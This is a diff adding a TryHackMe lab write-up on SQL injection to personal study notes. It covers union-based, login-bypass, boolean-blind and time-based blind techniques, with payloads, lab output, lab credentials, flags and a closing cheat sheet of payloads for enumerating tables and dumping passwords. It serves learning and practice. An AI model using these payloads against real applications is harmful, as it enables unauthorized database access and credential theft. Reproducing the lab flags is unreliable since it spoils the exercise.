@@ -852,5 +852,1102 @@ The defensive side is equally important: **prepared statements separate SQL code
 
 # Part 4
 
-<!-- Space reserved for the next part of the SQL Injection Introduction room. -->
+# TryHackMe --- SQL Injection Examples
+
+## Lab Overview
+
+This lab had **4 sequential levels**, each focusing on a different SQL
+Injection technique:
+
+1.  **Level 1 --- Union-Based SQLi (In-Band)**
+2.  **Level 2 --- Blind SQLi**
+3.  **Level 3 --- Boolean-Based Blind SQLi**
+4.  **Level 4 --- Time-Based Blind SQLi**
+
+I worked through the lab manually and used the **SQL Query / SQL Results
+/ Request Time** boxes to understand what the application was actually
+executing.
+
+> **Lab target:** TryHackMe's intentionally vulnerable SQL Injection
+> lab\
+> **Purpose:** Learning and practice only.
+
+------------------------------------------------------------------------
+
+# Level 1 --- Union-Based SQLi
+
+## Goal
+
+Find the password of user **martin**.
+
+The application initially showed:
+
+``` sql
+select * from article where id = 1
+```
+
+The important idea was that a `UNION SELECT` must return the **same
+number of columns** as the original query.
+
+------------------------------------------------------------------------
+
+## Step 1 --- Find the number of columns
+
+### Attempt 1
+
+I tried:
+
+``` sql
+1 UNION SELECT 1
+```
+
+❌ Error.
+
+### Attempt 2
+
+``` sql
+1 UNION SELECT 1,2
+```
+
+❌ Still an error.
+
+### Correct attempt
+
+``` sql
+1 UNION SELECT 1,2,3
+```
+
+✅ No error.
+
+So:
+
+``` text
+Number of columns = 3
+```
+
+### What I learned
+
+For:
+
+``` sql
+SELECT * FROM article WHERE id = 1
+```
+
+the injected `UNION SELECT` also needs to return **3 columns**.
+
+------------------------------------------------------------------------
+
+## Step 2 --- Identify which columns are displayed
+
+I then used:
+
+``` sql
+1 UNION SELECT 'A','B','C'
+```
+
+The page displayed:
+
+``` text
+B
+Article ID: A
+C
+```
+
+This was useful because it showed that all three UNION values could be
+reflected into the page.
+
+------------------------------------------------------------------------
+
+## Step 3 --- Find the database tables
+
+### My mistake
+
+I first tried the table enumeration payload and received:
+
+``` text
+URL Invalid 404
+```
+
+The problem was not the SQL logic itself; the input I initially entered
+was not being accepted correctly by the lab's URL handling.
+
+### Correct payload
+
+I then used:
+
+``` sql
+0 UNION SELECT 1,2,group_concat(table_name)
+FROM information_schema.tables
+WHERE table_schema = 'sqli_one'
+```
+
+✅ Result:
+
+``` text
+article,staff_users
+```
+
+So the interesting table was:
+
+``` text
+staff_users
+```
+
+### Why `0` was useful
+
+Using `0` made the original part:
+
+``` sql
+WHERE id = 0
+```
+
+return no normal article, allowing the UNION result to be easier to see.
+
+------------------------------------------------------------------------
+
+## Step 4 --- Find the columns of `staff_users`
+
+I queried:
+
+``` sql
+0 UNION SELECT 1,2,group_concat(column_name)
+FROM information_schema.columns
+WHERE table_name = 'staff_users'
+```
+
+✅ Result:
+
+``` text
+id,password,username
+```
+
+So:
+
+``` text
+staff_users
+├── id
+├── password
+└── username
+```
+
+------------------------------------------------------------------------
+
+## Step 5 --- Extract usernames and passwords
+
+I used:
+
+``` sql
+0 UNION SELECT 1,2,
+group_concat(username,':',password SEPARATOR '<br>')
+FROM staff_users
+```
+
+The lab displayed:
+
+``` text
+admin:p4ssword
+martin:pa$$word
+jim:work123
+```
+
+### Answer
+
+**Martin's password:**
+
+``` text
+pa$$word
+```
+
+### Level 1 result
+
+``` text
+Username: martin
+Password: pa$$word
+```
+
+> The Level 1 flag was not visible in the screenshots/conversation I
+> recorded, so I am not inventing one here.
+
+------------------------------------------------------------------------
+
+# Level 2 --- Blind SQLi
+
+## Goal
+
+Bypass the login.
+
+The original query shown by the lab was approximately:
+
+``` sql
+select * from users where username=""
+and password="" LIMIT 1;
+```
+
+Because the result did not directly expose useful database information,
+this level demonstrated **Blind SQL Injection**.
+
+------------------------------------------------------------------------
+
+## Correct payload
+
+I used the username field with:
+
+``` text
+" OR 1=1;--
+```
+
+and a dummy password such as:
+
+``` text
+test
+```
+
+The resulting SQL was shown as:
+
+``` sql
+select * from users where username=" OR 1=1;--"
+and password='test' LIMIT 1;
+```
+
+The injected condition:
+
+``` sql
+OR 1=1
+```
+
+is always true.
+
+The:
+
+``` text
+--
+```
+
+comments out the remaining part of the SQL query.
+
+------------------------------------------------------------------------
+
+## Result
+
+The lab displayed:
+
+``` text
+You bypassed the login and can now move to the next level
+```
+
+### Flag
+
+``` text
+THM{SQL_INJECTION_3840}
+```
+
+------------------------------------------------------------------------
+
+# Level 3 --- Boolean-Based Blind SQLi
+
+## Goal
+
+Use **TRUE/FALSE responses** to discover information from the database.
+
+The lab showed:
+
+``` text
+{"taken":true}
+```
+
+when the injected condition evaluated as true.
+
+------------------------------------------------------------------------
+
+## Step 1 --- Understand the injection point
+
+The application used:
+
+``` sql
+select * from users where username =
+'INPUT'
+...
+```
+
+I injected a UNION query into the username parameter.
+
+The important pattern was:
+
+``` sql
+' UNION SELECT 1,2,3 WHERE <condition>;--
+```
+
+------------------------------------------------------------------------
+
+## Step 2 --- Find the database name
+
+I tested:
+
+``` sql
+database() LIKE 's%'
+```
+
+The response was:
+
+``` text
+{"taken":true}
+```
+
+So the database started with:
+
+``` text
+s
+```
+
+Then I progressively tested:
+
+``` sql
+database() LIKE 'sqli_%'
+```
+
+This returned TRUE.
+
+I eventually confirmed:
+
+``` text
+sqli_three
+```
+
+### Database
+
+``` text
+sqli_three
+```
+
+------------------------------------------------------------------------
+
+## Step 3 --- Check whether the `users` table exists
+
+I tested the table name using `information_schema.tables`.
+
+The condition checking for:
+
+``` text
+users
+```
+
+returned TRUE.
+
+Therefore:
+
+``` text
+Database: sqli_three
+Table: users
+```
+
+------------------------------------------------------------------------
+
+## Step 4 --- Find the columns
+
+I checked:
+
+``` text
+username
+```
+
+and received TRUE.
+
+Then I checked:
+
+``` text
+password
+```
+
+and received TRUE.
+
+So the table structure we confirmed was:
+
+``` text
+users
+├── username
+└── password
+```
+
+------------------------------------------------------------------------
+
+## Important lesson from Level 3
+
+Boolean-based blind SQLi works by asking questions such as:
+
+``` text
+Does the database name start with "s"?
+```
+
+The application answers indirectly:
+
+``` text
+TRUE
+```
+
+or
+
+``` text
+FALSE
+```
+
+By repeatedly changing the condition, information can be recovered
+without directly displaying the database contents.
+
+### Flag
+
+``` text
+THM{SQL_INJECTION_9581}
+```
+
+------------------------------------------------------------------------
+
+# Level 4 --- Time-Based Blind SQLi
+
+## Goal
+
+Extract the admin password when the application does not give us a
+useful TRUE/FALSE response.
+
+Instead, the **response time** becomes the information channel.
+
+------------------------------------------------------------------------
+
+## Step 1 --- Find the UNION column count
+
+I tested a two-column UNION with:
+
+``` sql
+admin123' UNION SELECT SLEEP(5),2;--
+```
+
+The lab showed:
+
+``` text
+Request Time: 5.005
+```
+
+✅ This confirmed:
+
+``` text
+UNION SELECT has 2 columns
+```
+
+and:
+
+``` text
+SLEEP(5)
+```
+
+was being executed.
+
+------------------------------------------------------------------------
+
+## Step 2 --- Understand the time-based technique
+
+The general pattern became:
+
+``` sql
+IF(condition,SLEEP(5),0)
+```
+
+Meaning:
+
+``` text
+IF condition is TRUE
+    wait 5 seconds
+ELSE
+    return immediately
+```
+
+Therefore:
+
+``` text
+~5 seconds = TRUE
+~0 seconds = FALSE
+```
+
+This is the key concept of **time-based blind SQLi**.
+
+------------------------------------------------------------------------
+
+# Step 3 --- Discover the database name
+
+I tested:
+
+``` sql
+admin123' UNION SELECT
+IF(database() LIKE 's%',SLEEP(5),0),2;--
+```
+
+Result:
+
+``` text
+Request Time: 5.002
+```
+
+Therefore the database started with:
+
+``` text
+s
+```
+
+I continued character-by-character.
+
+### Confirmed progression
+
+``` text
+s
+sqli_
+sqli_fo
+sqli_for
+sqli_four
+```
+
+For example:
+
+``` sql
+database() LIKE 'sqli_%'
+```
+
+returned about 5 seconds.
+
+Then:
+
+``` sql
+database() LIKE 'sqli_fo%'
+```
+
+also returned about 5 seconds.
+
+Eventually:
+
+``` text
+Database = sqli_four
+```
+
+------------------------------------------------------------------------
+
+# Step 4 --- Check for tables
+
+I checked whether the database contained at least one table:
+
+``` sql
+admin123' UNION SELECT
+IF((SELECT COUNT(*)
+FROM information_schema.tables
+WHERE table_schema='sqli_four')>0,SLEEP(5),0),2;--
+```
+
+✅ TRUE / \~5 seconds.
+
+Then I specifically checked:
+
+``` text
+users
+```
+
+using:
+
+``` sql
+admin123' UNION SELECT
+IF((SELECT COUNT(*)
+FROM information_schema.tables
+WHERE table_schema='sqli_four'
+AND table_name='users')>0,SLEEP(5),0),2;--
+```
+
+✅ TRUE.
+
+Therefore:
+
+``` text
+Database: sqli_four
+Table: users
+```
+
+------------------------------------------------------------------------
+
+# Step 5 --- Check the columns
+
+### Check `username`
+
+``` sql
+admin123' UNION SELECT
+IF((SELECT COUNT(*)
+FROM information_schema.columns
+WHERE table_schema='sqli_four'
+AND table_name='users'
+AND column_name='username')>0,SLEEP(5),0),2;--
+```
+
+✅ TRUE.
+
+### Check `password`
+
+``` sql
+admin123' UNION SELECT
+IF((SELECT COUNT(*)
+FROM information_schema.columns
+WHERE table_schema='sqli_four'
+AND table_name='users'
+AND column_name='password')>0,SLEEP(5),0),2;--
+```
+
+✅ TRUE.
+
+So the confirmed structure was:
+
+``` text
+sqli_four
+└── users
+    ├── username
+    └── password
+```
+
+------------------------------------------------------------------------
+
+# Step 6 --- Extract the admin password
+
+We knew the target was:
+
+``` text
+username = admin
+```
+
+The extraction condition was:
+
+``` sql
+(SELECT password FROM users WHERE username='admin') LIKE '...%'
+```
+
+combined with:
+
+``` sql
+IF(condition,SLEEP(3),0)
+```
+
+------------------------------------------------------------------------
+
+## Character 1
+
+Test:
+
+``` sql
+admin123' UNION SELECT
+IF((SELECT password FROM users WHERE username='admin') LIKE '4%',SLEEP(3),0),2;--
+```
+
+Result:
+
+``` text
+~3 seconds
+```
+
+Therefore:
+
+``` text
+Password starts with 4
+```
+
+------------------------------------------------------------------------
+
+## Character 2
+
+Test:
+
+``` sql
+admin123' UNION SELECT
+IF((SELECT password FROM users WHERE username='admin') LIKE '49%',SLEEP(3),0),2;--
+```
+
+Result:
+
+``` text
+Request Time: 3.003
+```
+
+Therefore:
+
+``` text
+Password starts with 49
+```
+
+------------------------------------------------------------------------
+
+## Characters 3 and 4
+
+Continuing the same process:
+
+``` text
+496
+```
+
+was confirmed.
+
+Then:
+
+``` text
+4961
+```
+
+was confirmed.
+
+### Final password
+
+``` text
+4961
+```
+
+### Level 4 flag
+
+``` text
+THM{SQL_INJECTION_1093}
+```
+
+------------------------------------------------------------------------
+
+# Final Answers / Results
+
+  ---------------------------------------------------------------------------------
+  Level             Technique         Important Result  Flag
+  ----------------- ----------------- ----------------- ---------------------------
+  1                 Union-Based SQLi  Martin's password Not recorded
+                                      = `pa$$word`      
+
+  2                 Blind SQLi        Login bypass      `THM{SQL_INJECTION_3840}`
+
+  3                 Boolean-Based     Database =        `THM{SQL_INJECTION_9581}`
+                    Blind SQLi        `sqli_three`      
+
+  4                 Time-Based Blind  Admin password =  `THM{SQL_INJECTION_1093}`
+                    SQLi              `4961`            
+  ---------------------------------------------------------------------------------
+
+------------------------------------------------------------------------
+
+# Mistakes I Made and How I Corrected Them
+
+## Mistake 1 --- Thinking no visible change means the payload did not work
+
+At Level 1, after trying a UNION payload, I initially thought:
+
+> "nothing changed"
+
+### Correction
+
+I learned to watch the **SQL Query box**, not just the article output.
+
+The lab shows the actual query being executed. If the query changes,
+that is already useful evidence.
+
+------------------------------------------------------------------------
+
+## Mistake 2 --- Using the wrong number of UNION columns
+
+I tried:
+
+``` sql
+UNION SELECT 1
+```
+
+and:
+
+``` sql
+UNION SELECT 1,2
+```
+
+before finding:
+
+``` sql
+UNION SELECT 1,2,3
+```
+
+### Correction
+
+Use incremental column-count testing:
+
+``` text
+1 column
+↓
+2 columns
+↓
+3 columns
+...
+```
+
+until the query works.
+
+The important rule is:
+
+``` text
+Both SELECT statements must return the same number of columns.
+```
+
+------------------------------------------------------------------------
+
+## Mistake 3 --- Getting a 404 while enumerating tables
+
+My first table enumeration attempt produced:
+
+``` text
+URL Invalid 404
+```
+
+### Correction
+
+I corrected the input and used:
+
+``` sql
+0 UNION SELECT 1,2,group_concat(table_name)
+FROM information_schema.tables
+WHERE table_schema = 'sqli_one'
+```
+
+which successfully returned:
+
+``` text
+article,staff_users
+```
+
+### Lesson
+
+When the lab returns a 404, don't immediately assume the SQL logic is
+wrong.
+
+First check:
+
+-   Did I type the payload exactly?
+-   Did I accidentally break the URL?
+-   Did I include quotes correctly?
+-   Did I change anything besides the intended parameter?
+-   Does the SQL Query box show the query I expected?
+
+------------------------------------------------------------------------
+
+## Mistake 4 --- Not understanding why `0` was useful
+
+I initially used `1` in UNION tests.
+
+### Correction
+
+Using:
+
+``` text
+0
+```
+
+was useful because:
+
+``` sql
+WHERE id = 0
+```
+
+normally returns no article.
+
+That makes the injected UNION result easier to identify.
+
+------------------------------------------------------------------------
+
+## Mistake 5 --- Confusing Boolean Blind SQLi with Time-Based Blind SQLi
+
+Level 3 and Level 4 both use blind techniques, but the feedback
+mechanism is different.
+
+### Level 3
+
+``` text
+TRUE / FALSE response
+```
+
+### Level 4
+
+``` text
+Response time
+```
+
+For Level 4:
+
+``` text
+~0 sec → FALSE
+~3/5 sec → TRUE
+```
+
+------------------------------------------------------------------------
+
+## Mistake 6 --- Trying to guess the whole password at once
+
+Instead of directly seeing:
+
+``` text
+4961
+```
+
+the lab makes us discover it.
+
+### Correct approach
+
+Use a prefix:
+
+``` sql
+LIKE '4%'
+```
+
+then:
+
+``` sql
+LIKE '49%'
+```
+
+then:
+
+``` sql
+LIKE '496%'
+```
+
+then:
+
+``` sql
+LIKE '4961%'
+```
+
+Each successful delay confirms another character.
+
+------------------------------------------------------------------------
+
+# What I Actually Learned
+
+## 1. UNION-Based SQLi
+
+Used when the application's response displays database results.
+
+Basic idea:
+
+``` sql
+UNION SELECT ...
+```
+
+Main challenge:
+
+``` text
+Find the correct number of columns.
+```
+
+------------------------------------------------------------------------
+
+## 2. Blind SQLi
+
+The application does not directly reveal useful data.
+
+Instead, we use a condition such as:
+
+``` sql
+OR 1=1
+```
+
+to change the application's behaviour.
+
+------------------------------------------------------------------------
+
+## 3. Boolean-Based Blind SQLi
+
+Ask database questions:
+
+``` sql
+database() LIKE 's%'
+```
+
+and observe:
+
+``` text
+TRUE / FALSE
+```
+
+Then recover information character-by-character.
+
+------------------------------------------------------------------------
+
+## 4. Time-Based Blind SQLi
+
+When there is no useful visible TRUE/FALSE difference, deliberately
+create a delay:
+
+``` sql
+IF(condition,SLEEP(5),0)
+```
+
+Then:
+
+``` text
+5 seconds → TRUE
+0 seconds → FALSE
+```
+
+This turns **time itself into a data channel**.
+
+------------------------------------------------------------------------
+
+# Quick Cheat Sheet
+
+### Find UNION column count
+
+``` sql
+' UNION SELECT 1,2,3;--
+```
+
+### Show which columns are reflected
+
+``` sql
+' UNION SELECT 'A','B','C';--
+```
+
+### List tables
+
+``` sql
+0 UNION SELECT 1,2,group_concat(table_name)
+FROM information_schema.tables
+WHERE table_schema='DATABASE'
+```
+
+### List columns
+
+``` sql
+0 UNION SELECT 1,2,group_concat(column_name)
+FROM information_schema.columns
+WHERE table_name='TABLE'
+```
+
+### Dump username + password
+
+``` sql
+0 UNION SELECT 1,2,
+group_concat(username,':',password SEPARATOR '<br>')
+FROM users
+```
+
+### Boolean test
+
+``` sql
+' UNION SELECT 1,2,3 WHERE <condition>;--
+```
+
+### Time-based test
+
+``` sql
+' UNION SELECT IF(<condition>,SLEEP(5),0),2;--
+```
+
+### Password prefix test
+
+``` sql
+' UNION SELECT IF(
+(SELECT password FROM users WHERE username='admin')
+LIKE '4%',
+SLEEP(3),0
+),2;--
+```
+
+------------------------------------------------------------------------
+
+
+
 
